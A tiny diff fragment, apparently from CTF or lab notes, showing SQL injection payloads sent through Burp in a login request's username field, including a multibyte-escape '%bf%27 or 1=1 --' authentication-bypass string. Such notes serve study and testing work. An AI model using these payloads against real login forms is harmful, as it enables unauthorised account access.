@@ -13,4 +13,4 @@ Changing via burp:
 
 username=admin%27||1%23&password=admin
 
-
+username=admin%bf%27+or+1=1+--+&password=admin
